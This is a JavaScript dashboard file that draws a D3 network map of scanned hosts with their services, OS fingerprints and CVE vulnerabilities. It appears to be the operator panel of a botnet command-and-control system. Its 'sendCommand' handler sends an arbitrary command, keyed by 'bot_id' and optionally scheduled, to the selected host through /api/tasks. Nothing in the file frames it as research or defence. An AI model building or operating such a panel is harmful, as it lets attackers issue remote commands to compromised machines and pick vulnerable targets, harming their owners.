// Load network data function loadData() { fetch('/api/network/map') .then(response => response.json()) .then(data => { networkData = data; updateVisualization(); updateStats(data.stats); updateFilters(data); }); } // Update network visualization function updateVisualization() { // Update links const link = g.selectAll(".link") .data(networkData.links, d => `${d.source}-${d.target}`); link.exit().remove(); const linkEnter = link.enter() .append("line") .attr("class", "link"); // Update nodes const node = g.selectAll(".node") .data(networkData.nodes, d => d.id); node.exit().remove(); const nodeEnter = node.enter() .append("g") .attr("class", "node") .call(d3.drag() .on("start", dragstarted) .on("drag", dragged) .on("end", dragended)) .on("click", selectNode); nodeEnter.append("circle") .attr("r", d => getNodeSize(d)) .style("fill", d => getNodeColor(d)); nodeEnter.append("text") .attr("dy", ".35em") .attr("x", 12) .text(d => getNodeLabel(d)); // Update simulation simulation.nodes(networkData.nodes); simulation.force("link").links(networkData.links); simulation.alpha(1).restart(); } function ticked() { g.selectAll(".link") .attr("x1", d => d.source.x) .attr("y1", d => d.source.y) .attr("x2", d => d.target.x) .attr("y2", d => d.target.y); g.selectAll(".node") .attr("transform", d => `translate(${d.x},${d.y})`); } function getNodeSize(d) { if (d.type === 'subnet') return 15; return d.importance > 50 ? 12 : 8; } function getNodeColor(d) { if (d.type === 'subnet') return '#666'; if (d.tags.includes('gateway')) return '#dc3545'; if (d.tags.includes('dns-server')) return '#0d6efd'; if (d.tags.includes('web-server')) return '#198754'; return '#666'; } function getNodeLabel(d) { if (d.type === 'subnet') return d.id; return d.hostname || d.id; } function selectNode(event, d) { selectedNode = d; d3.selectAll(".node circle").style("stroke-width", 1.5); d3.select(this).select("circle").style("stroke-width", 3); if (d.type === 'host') { fetch(`/api/network/hosts?search=${d.id}`) .then(response => response.json()) .then(hosts => { if (hosts.length > 0) { updateHostDetails(hosts[0]); } }); } } function updateHostDetails(host) { if (!host) return; const services = Object.entries(host.services) .map(([port, service]) => { return `${port}/${service.name} ${service.version || ''}`; }).join(' '); const vulns = host.vulnerabilities .map(v => `
• ${v.cve_id}: ${v.description}
`) .join(''); document.getElementById('hostDetails').innerHTML = `
IP: ${host.ip}
Hostname: ${host.hostname || 'N/A'}
OS: ${host.fingerprint.os_match || 'Unknown'} (${host.fingerprint.os_accuracy}% confidence)
First Seen: ${new Date(host.first_seen * 1000).toLocaleString()}
Last Seen: ${new Date(host.last_seen * 1000).toLocaleString()}
Services:
${services}
Tags:
${host.tags.map(t => `${t}`).join('')}
${vulns ? `
Vulnerabilities:
${vulns}
` : ''} `; } function updateStats(stats) { document.getElementById('totalHosts').textContent = stats.total_hosts; document.getElementById('activeHosts').textContent = stats.active_hosts; document.getElementById('totalServices').textContent = Object.keys(stats.services).length; document.getElementById('vulnerableHosts').textContent = stats.tagged_hosts['vulnerable'] || 0; document.getElementById('lastUpdate').textContent = new Date().toLocaleTimeString(); } function updateFilters(data) { // Update OS filter const osFilter = document.getElementById('osFilter'); const osTypes = new Set(); Object.values(data.hosts).forEach(host => { if (host.fingerprint.os_family) { osTypes.add(host.fingerprint.os_family); } }); updateFilterOptions(osFilter, Array.from(osTypes)); // Update service filter const serviceFilter = document.getElementById('serviceFilter'); const services = new Set(); Object.values(data.hosts).forEach(host => { Object.values(host.services).forEach(service => { services.add(service.name); }); }); updateFilterOptions(serviceFilter, Array.from(services)); // Update tag filter const tagFilter = document.getElementById('tagFilter'); const tags = new Set(); Object.values(data.hosts).forEach(host => { host.tags.forEach(tag => tags.add(tag)); }); updateFilterOptions(tagFilter, Array.from(tags)); } function updateFilterOptions(select, options) { const value = select.value; select.innerHTML = ''; options.sort().forEach(option => { const opt = document.createElement('option'); opt.value = option; opt.textContent = option; select.appendChild(opt); }); select.value = value; } // Event listeners document.getElementById('sendCommand').onclick = () => { if (!selectedNode || selectedNode.type !== 'host') { alert('Please select a host first'); return; } const command = document.getElementById('commandInput').value; const scheduledTime = document.getElementById('scheduleTime').value; fetch('/api/tasks', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bot_id: selectedNode.id, command: command, scheduled_time: scheduledTime || null }) }) .then(response => response.json()) .then(result => { document.getElementById('outputArea').innerHTML += `
[${new Date().toLocaleTimeString()}] ${result.message || 'Command sent'}
`; document.getElementById('commandInput').value = ''; document.getElementById('scheduleTime').value = ''; }); }; ['searchFilter', 'osFilter', 'serviceFilter', 'tagFilter'].forEach(id => { document.getElementById(id).onchange = loadData; }); document.getElementById('refreshData').onclick = loadData; document.getElementById('zoomIn').onclick = () => zoom.scaleBy(svg, 1.2); document.getElementById('zoomOut').onclick = () => zoom.scaleBy(svg, 0.8); document.getElementById('resetZoom').onclick = () => { svg.transition().duration(750).call(zoom.transform, d3.zoomIdentity); }; // Force simulation helpers function dragstarted(event) { if (!event.active) simulation.alphaTarget(0.3).restart(); event.subject.fx = event.subject.x; event.subject.fy = event.subject.y; } function dragged(event) { event.subject.fx = event.x; event.subject.fy = event.y; } function dragended(event) { if (!event.active) simulation.alphaTarget(0); event.subject.fx = null; event.subject.fy = null; } // Initial load loadData(); // Regular updates setInterval(loadData, 30000);
